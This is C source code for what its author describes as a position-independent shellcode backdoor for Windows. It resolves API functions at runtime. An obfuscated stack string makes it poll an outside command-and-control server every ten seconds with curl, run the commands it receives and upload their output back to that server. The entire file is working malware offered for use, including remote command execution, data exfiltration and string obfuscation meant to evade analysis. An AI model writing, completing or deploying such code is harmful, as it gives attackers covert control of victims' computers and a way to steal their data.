//Author: Shaddy43
//Designation: Cybersecurity Engineer, reverse engineer and malware developr
//Original credits to hasherezade of vxunderground who gave the methodology of creating postion independent shellcode
//I've followed the methodology to create a complete custom backdoor communicating on c3 using https and APIs

//This code is called position independent code because it doesn't depend on a linker to resolve external dependencies like importing dlls and using functions inside.
//This backdoor uses cmd to get commands from the c3 server after every 10 seconds and execute it on the system.
//The executed command is saved into a text file and then uploaded back to the c3 server.
//With the help of MSVC we can convert this code to .asm file and then link those assembly instructions to a binary.
//After that we can extract shellcode from the .text section of that binary.

#include<windows.h>
#include "peb_lookup.h"

// It's worth noting that strings can be defined inside the .text section:
#pragma code_seg(".text")

int main()
{
    // Stack based strings for libraries and functions the shellcode needs
    wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
    char load_lib_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
    char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
    //char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
    char winexec_name[] = { 'W', 'i', 'n', 'E', 'x', 'e', 'c', 0 };
    char sleep_name[] = { 'S','l','e','e','p', 0 };

    // stack based strings to be passed to the winexec api
    //This string_cmd takes commands from the c3 server, executes those commands on the system, saves the output in a text file and then uploads the output back to the c3 server!
    char cmd[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','d','a','t','a','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t',' ','&','&',' ','c','u','r','l',' ','-','-','f','o','r','m',' ','"','f','i','l','e','T','o','U','p','l','o','a','d','=','@','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t','"',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','g','e','t','f','i','l','e','.','p','h','p','"',' ','"', 0};

	// resolve kernel32 image base
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base) {
        return 1;
    }

    // resolve loadlibraryA() address
    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
    if (!load_lib) {
        return 2;
    }

    // resolve getprocaddress() address
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
    if (!get_proc) {
        return 3;
    }

    // loadlibrarya and getprocaddress function definitions
    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
        = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
	
    UINT(WINAPI * _WinExec)(
        _In_ LPCSTR lpCmdLine,
        _In_ UINT uCmdShow) = (UINT (WINAPI*)(
            _In_ LPCSTR,
            _In_ UINT)) _GetProcAddress((HMODULE)base, winexec_name);

    if (_WinExec == NULL) return 4;

    //UINT return_val = _WinExec(cmd, 0);

    VOID(WINAPI * _Sleep)(
        _In_ DWORD dwMilliseconds) = (VOID (WINAPI*)(
            _In_ DWORD)) _GetProcAddress((HMODULE)base, sleep_name);

    if (_Sleep == NULL) return 5;

    while(true)
	{
		UINT return_val = _WinExec(cmd, 0);
        _Sleep(10000);
	}
    //UINT return_val = _WinExec(cmd, 0);

    return 0;
}